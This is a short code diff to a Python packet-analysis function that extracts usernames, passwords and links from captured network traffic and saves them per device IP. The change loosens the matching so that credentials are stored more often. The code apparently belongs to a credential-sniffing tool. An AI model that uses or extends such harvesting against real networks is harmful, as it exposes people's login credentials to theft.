@@ -41,6 +41,7 @@ def analyzed_captured_packet(app, packet_info):
         hyperlinks = extract_hyperlinks(payload)
         
         device_ip = packet_info.get('src_ip')
+        dst_ip = packet_info.get('dst_ip')
         
         try:
             # Find existing entry for this IP
@@ -48,12 +49,20 @@ def analyzed_captured_packet(app, packet_info):
                 device_ip=device_ip
             ).first()
             
+            if not existing_entry:
+                existing_entry = CollectedInfo.query.filter_by(
+                    device_ip=dst_ip
+                ).first() 
+
             if existing_entry:
                 # Update existing entry
-                if username and password:
+                if username:
                     existing_entry.device_username = username
+                    print("username found")
+                if password:
                     existing_entry.device_pass = password
-                
+                    print("password found")
+
                 if hyperlinks:
                     # Append new hyperlinks to existing message
                     current_links = existing_entry.message or ''
